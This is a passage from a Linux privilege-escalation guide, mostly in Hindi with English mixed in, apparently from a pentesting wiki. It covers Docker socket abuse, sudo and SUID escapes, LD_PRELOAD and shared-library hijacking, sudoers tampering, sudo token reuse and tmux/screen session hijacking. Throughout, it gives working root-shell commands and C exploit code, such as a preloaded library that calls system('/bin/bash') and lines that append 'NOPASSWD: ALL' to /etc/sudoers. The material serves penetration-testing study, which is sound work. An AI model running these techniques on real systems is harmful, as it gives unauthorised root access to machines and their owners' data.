curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से कनेक्शन स्थापित करें, जिससे उसके अंदर कमांड चलाने में सक्षम हों।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`сocat` कनेक्शन सेट करने के बाद, आप container में सीधे commands चला सकते हैं, जिससे host की filesystem पर root-स्तरीय पहुँच प्राप्त होती है।

### Others

Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

देखें **docker से बाहर निकलने या इसे दुरुपयोग कर अधिकार बढ़ाने के और तरीके** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) सिस्टम है जो applications को प्रभावी रूप से interact और डेटा साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिजाइन किया गया, यह applications के बीच विभिन्न प्रकार के संचार के लिए एक मजबूत ढांचा प्रदान करता है।

यह सिस्टम बहुमुखी है — यह बेसिक IPC का समर्थन करता है जो processes के बीच डेटा आदान-प्रदान को बेहतर बनाता है, और यह enhanced UNIX domain sockets की याद दिलाता है। इसके अलावा, यह इवेंट या सिग्नल ब्रॉडकास्ट करने में मदद करता है, जिससे सिस्टम घटकों के बीच निर्बाध इंटिग्रेशन होता है। उदाहरण के लिए, incoming call के बारे में Bluetooth daemon का एक सिग्नल म्यूज़िक प्लेयर को म्यूट करने के लिए ट्रिगर कर सकता है, जिससे user experience बेहतर होता है। इसके अतिरिक्त, D-Bus एक remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है और पारंपरिक रूप से जटिल प्रक्रियाओं को सुव्यवस्थित करता है।

D-Bus allow/deny मॉडल पर काम करता है, जो matching policy rules के संचयी प्रभाव के आधार पर message permissions (method calls, signal emissions, आदि) को प्रबंधित करता है। ये नीतियाँ bus के साथ इंटरैक्शन को निर्दिष्ट करती हैं, और इन permissions के दुरुपयोग के माध्यम से privilege escalation संभव हो सकता है।

ऐसी एक नीति का उदाहरण /etc/dbus-1/system.d/wpa_supplicant.conf में दिया गया है, जो root user को fi.w1.wpa_supplicant1 से messages own, send, और receive करने की permissions विस्तार से बताती है।

यदि नीतियों में किसी विशेष user या group का उल्लेख नहीं होता तो वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context नीतियाँ उन सभी पर लागू होती हैं जिन्हें अन्य विशिष्ट नीतियाँ कवर नहीं करतीं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ सीखें कि कैसे D-Bus communication को enumerate और exploit करें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करके और मशीन की स्थिति का पता लगाना हमेशा दिलचस्प होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उस मशीन पर चल रहे network services की जाँच करें जिनसे आप उसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जांचें कि क्या आप sniff traffic कर सकते हैं। यदि आप कर सकते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जाँच करें कि आप **कौन** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो **UID > INT_MAX** वाले उपयोगकर्ताओं को escalate privileges करने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँच करें कि क्या आप किसी ऐसे समूह के **सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँच करें कि क्लिपबोर्ड में कुछ रोचक है या नहीं (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप किसी भी environment का **password जानते हैं**, तो उस password का उपयोग करके प्रत्येक **user** के रूप में **login** करने का प्रयास करें।

### Su Brute

यदि आप अधिक शोर-मचाने की परवाह नहीं करते हैं और `su` और `timeout` binaries कंप्यूटर पर मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user पर brute-force करने का प्रयास कर सकते हैं.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी users पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर में **लिख (write) सकते हैं**, तो आप privileges escalate कर सकते हैं उस writable फ़ोल्डर के अंदर उसी नाम का एक backdoor बनाकर जो किसी command जैसा हो जिसे किसी अलग user (ideal रूप से root) द्वारा execute किया जाएगा और जो $PATH में आपके writable फ़ोल्डर से पहले किसी फ़ोल्डर से load नहीं किया जाता।

### SUDO and SUID

आपको कुछ command को sudo का उपयोग करके execute करने की अनुमति हो सकती है या उन पर suid bit सेट हो सकता है। इसे जांचने के लिए उपयोग करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको files पढ़ने और/या लिखने या यहाँ तक कि एक command निष्पादित करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को पासवर्ड जाने बिना किसी अन्य उपयोगकर्ता की privileges के साथ कोई command चलाने की अनुमति दे सकता है.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `vim` को `root` के रूप में चला सकता है, और अब `root` निर्देशिका में एक ssh key जोड़कर या `sh` को कॉल करके shell प्राप्त करना आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को **set an environment variable** करते हुए किसी कमांड को निष्पादित करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **vulnerable** था **PYTHONPATH hijacking** के लिए ताकि स्क्रिप्ट को root के रूप में चलाते समय किसी मनमाना python लाइब्रेरी को लोड किया जा सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep के माध्यम से संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के गैर-इंटरैक्टिव स्टार्टअप व्यवहार का उपयोग करके किसी अनुमत कमांड को कॉल करते समय मनमाना कोड को root के रूप में चला सकते हैं।

- यह कैसे काम करता है: गैर-इंटरैक्टिव शेल के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और लक्ष्य स्क्रिप्ट चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम स्क्रिप्ट या शेल wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root विशेषाधिकारों के साथ source की जाती है।

- आवश्यकताएँ:
- एक sudo नियम जिसे आप चला सकते हैं (कोई भी लक्ष्य जो `/bin/bash` को गैर-इंटरैक्टिव रूप से invoke करता है, या कोई भी bash स्क्रिप्ट)।
- `BASH_ENV` `env_keep` में उपस्थित होना चाहिए (जांचने के लिए `sudo -l` का उपयोग करें)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- हटाएँ `BASH_ENV` (और `ENV`) को `env_keep` से; `env_reset` को प्राथमिकता दें।
- `sudo-allowed` commands के लिए shell wrappers से बचें; न्यूनतम binaries का उपयोग करें।
- जब preserved env vars का उपयोग हो, तब sudo I/O logging और alerting पर विचार करें।

### Sudo execution बायपास करने के रास्ते

**Jump** करके अन्य फाइलें पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path

यदि **sudo अनुमति** किसी एक command को **path निर्दिष्ट किए बिना** दी गई है: _hacker10 ALL= (root) less_ तो आप इसे PATH variable बदलकर exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक उस स्थिति में भी उपयोग की जा सकती है यदि एक **suid** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

यदि कोई **suid** binary **executes another command specifying the path**, तो आप कोशिश कर सकते हैं कि जिस command को suid file कॉल कर रही है उसके नाम से आप **export a function** बनाकर उसे export करें।

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** करने के लिए:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह उन पाथों को नियंत्रित करता है जहाँ लाइब्रेरी खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी असामान्य दिखने वाले binary में **SUID** permissions हों, तो यह अच्छी प्रैक्टिस है कि जाँच करें कि वह **.so** files सही तरीके से लोड कर रहा है या नहीं। इसे निम्नलिखित command चलाकर जाँचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर यह exploitation की संभाव्यता का संकेत देती है।

इसे exploit करने के लिए, आप एक C फ़ाइल बनाएँगे, उदाहरण के लिए _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compiled और executed होने पर, file permissions को बदलकर और elevated privileges के साथ एक shell चलाकर privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दिए गए C file को shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise संभव हो।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस फ़ोल्डर से library लोड कर रहा है जहाँ हम लिख सकते हैं, तो चलिए उस फ़ोल्डर में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको निम्नलिखित जैसी त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है जिन्हें एक attacker स्थानीय सुरक्षा प्रतिबंधों को bypass करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी ऐसा ही है लेकिन उन मामलों के लिए जहाँ आप किसी command में **only inject arguments** कर सकते हैं।

प्रोजेक्ट उन Unix binaries के वैध फ़ंक्शन्स को इकट्ठा करता है जिन्हें restricted shells से बाहर निकलने, privileges escalate या बनाए रखने, files transfer करने, bind और reverse shells spawn करने, और अन्य post-exploitation tasks को सुविधाजनक करने के लिए abuse किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं तो आप [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool का उपयोग कर सकते हैं यह जांचने के लिए कि यह किसी sudo rule को exploit करने का तरीका ढूंढता है या नहीं।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है पर पासवर्ड नहीं, आप privileges escalate कर सकते हैं—एक sudo command के execution का इंतज़ार करके और फिर session token hijack करके।

Requirements to escalate privileges:

- आपके पास पहले से ही user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **`sudo`** का उपयोग करके हाल के 15 मिनटों में कुछ execute किया हो (डिफ़ॉल्ट रूप से यही sudo token की अवधि है जो हमें बिना पासवर्ड के `sudo` चलाने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का output 0 होना चाहिए
- `gdb` accessible होना चाहिए (आप इसे upload कर पा सकें)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ सक्षम कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को बदल कर और `kernel.yama.ptrace_scope = 0` सेट करके)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- दूसरा **exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व में setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers file बनाएगा** जो **sudo tokens को स्थायी बना देगा और सभी उपयोगकर्ताओं को sudo उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाई गई किसी भी फ़ाइल पर **लिखने की अनुमति** है, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके किसी user और PID के लिए **sudo token** बना सकते हैं.\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ एक shell है, तो आप पासवर्ड जाने बिना निम्नलिखित करके **obtain sudo privileges** कर सकते हैं:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **डिफॉल्ट रूप से केवल user root और group root द्वारा पढ़ी जा सकती हैं**.\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त कर सकते हैं**, और यदि आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD के लिए `doas` जैसे `sudo` बाइनरी के कुछ विकल्प होते हैं; इसकी कॉन्फ़िगरेशन को `/etc/doas.conf` पर जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि **user usually connects to a machine and uses `sudo`** to escalate privileges और आपने उस user context में एक shell प्राप्त कर लिया है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपके कोड को root के रूप में चलाएगा और फिर user का कमांड चलाएगा। इसके बाद, user context का **$PATH** संशोधित करें (उदाहरण के लिए नई path को .bash_profile में जोड़कर) ताकि जब user `sudo` चलाए तो आपका sudo executable execute हो।

ध्यान दें कि अगर user किसी अलग shell (not bash) का उपयोग करता है तो आपको नई path जोड़ने के लिए अन्य files में परिवर्तन करने होंगे। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं

Or running something like:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर, यह प्रोग्राम द्वारा उस स्थान पर उपयोग किया जाएगा जैसा कि `RPATH` वेरिएबल में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` कमांड का उपयोग करके एक evil library बनाएं
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी process को उपलब्ध root privileges का **एक उपसमूह** प्रदान करते हैं। यह प्रभावी रूप से root **privileges को छोटे और विशिष्ट इकाइयों में विभाजित** कर देता है। इन इकाइयों में से प्रत्येक को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह पूरी privileges सेट कम हो जाती है, जिससे exploitation के जोखिम घटते हैं।\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

एक डायरेक्टरी में, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. ये permissions file या directory के access पर अधिक नियंत्रण प्रदान करते हैं, क्योंकि ये उन specific users को अधिकार देने या नकारने की अनुमति देते हैं जो owner नहीं हैं या group का हिस्सा नहीं हैं। यह स्तर अधिक **granularity सुनिश्चित करता है** जिससे access management और सटीक होता है। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**देँ** user "kali" को किसी फ़ाइल पर read और write permissions:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुली shell sessions

**पुराने संस्करणों** में आप किसी अन्य उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
**नवीनतम संस्करणों** में आप केवल **आपके अपने user** के **screen** sessions से ही **connect** कर पाएँगे। हालांकि, आप **session के अंदर रोचक जानकारी** पा सकते हैं।

### screen sessions hijacking

**screen sessions की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**किसी session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** उदाहरण के लिए।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

September 2006 और May 13th, 2008 के बीच Debian आधारित सिस्टम (Ubuntu, Kubuntu, आदि) पर बनाए गए सभी SSL और SSH keys इस बग से प्रभावित हो सकते हैं.\
यह बग उन OS में नया ssh key बनाते समय उत्पन्न होता है, क्योंकि **केवल 32,768 संभावनाएँ संभव थीं**. इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**. आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह बताता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह बताता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह बताता है कि क्या server खाली password वाले अकाउंट्स में login की अनुमति देता है। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

